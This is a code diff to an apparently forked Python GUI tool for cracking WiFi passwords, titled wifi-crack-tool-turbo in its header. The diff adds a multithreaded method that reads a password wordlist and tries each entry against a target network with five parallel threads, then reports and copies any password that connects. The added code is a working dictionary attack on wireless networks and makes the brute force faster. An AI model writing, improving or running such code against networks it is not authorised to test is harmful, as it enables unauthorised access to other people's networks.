@@ -1,8 +1,11 @@
 # -*- coding: UTF-8 -*-
 """
-Author: 白恒aead
-Repositories: https://github.com/baihengaead/wifi-crack-tool
-Version: 1.2.5
+Original Author: 白恒aead
+Original Repositories: https://github.com/baihengaead/wifi-crack-tool
+Maintainer: Pandaexc7
+Forked Repositories: https://github.com/pandaexc7/wifi-crack-tool-turbo
+Version: 1.3.0 (基于原版 v1.2.5 + 多线程优化)
+License: MIT
 """
 import os,sys,datetime,time,threading,ctypes,json
 import platform
@@ -11,6 +14,8 @@ from pywifi import const,PyWiFi,Profile
 from pywifi.iface import Interface
 
 import pyperclip
+
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 from PySide6.QtCore import Qt, QThread, Signal, QSize
 from PySide6.QtWidgets import QApplication, QMainWindow, QFileDialog, QWidget, QMessageBox
@@ -508,7 +513,7 @@ class WifiCrackTool:
                 pwds = {}
                 colors = {}
                 for ssid in self.ssids:
-                    pwd = self.crack(ssid)
+                    pwd = self.multithread_crack(ssid)
                     if isinstance(pwd,str):
                         pwds[ssid] = pwd
                         colors[ssid] = "green"
@@ -532,7 +537,7 @@ class WifiCrackTool:
                 self.is_auto = False
                 self.win.reset_controls_state.send()
                 return False
-        
+
         def crack(self,ssid:str):
             '''
             破解wifi
@@ -601,6 +606,60 @@ class WifiCrackTool:
             except Exception as r:
                 self.win.show_error.send('错误警告','破解过程中发生未知错误 %s' %(r))
                 self.win.show_msg.send(f"[错误]破解过程中发生未知错误 {r}\n\n","red")
+                self.win.reset_controls_state.send()
+                return False
+
+        def multithread_crack(self, ssid: str):
+            '''
+            多线程破解wifi
+            :ssid wifi名称
+            '''
+            try:
+                self.iface.disconnect()
+                self.win.show_msg.send("正在断开现有连接...\n", "black")
+                time.sleep(1)
+                if self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:
+                    self.win.show_msg.send("现有连接断开成功！\n\n", "black")
+                else:
+                    self.win.show_msg.send("[错误]现有连接断开失败！\n\n", "red")
+                    return False
+
+                self.win.show_msg.send(f"开始使用多线程破解WiFi[{ssid}]...\n\n", "blue")
+                max_workers = 5  # 可根据硬件调整线程数
+                found_password = None
+
+                def try_password(pwd, count):
+                    with self.tool.crack_pause_condition:
+                        if self.tool.paused:
+                            self.tool.crack_pause_condition.wait()
+                    if not self.tool.run:
+                        return False
+                    result = self.connect(ssid, pwd, 'txt', count)
+                    return pwd if result else False
+
+                with open(self.tool.config_settings_data['pwd_txt_path'], 'r', encoding='utf-8',
+                          errors='ignore') as lines:
+                    passwords = [line.strip() for line in lines if line.strip()]
+
+                with ThreadPoolExecutor(max_workers=max_workers) as executor:
+                    futures = {executor.submit(try_password, pwd, idx + 1): pwd for idx, pwd in enumerate(passwords)}
+                    for future in as_completed(futures):
+                        result = future.result()
+                        if result:
+                            found_password = result
+                            self.win.show_info.send('破解成功', f"连接成功，密码：{result}\n(已复制到剪切板)")
+                            self.win.reset_controls_state.send()
+                            executor.shutdown(wait=False, cancel_futures=True)
+                            return result
+
+                if not found_password:
+                    self.win.show_info.send('破解失败', "破解失败，已尝试完密码本中所有可能的密码")
+                    self.win.reset_controls_state.send()
+                return False
+
+            except Exception as r:
+                self.win.show_error.send('错误警告', f'破解过程中发生未知错误 {r}')
+                self.win.show_msg.send(f"[错误]破解过程中发生未知错误 {r}\n\n", "red")
                 self.win.reset_controls_state.send()
                 return False
         
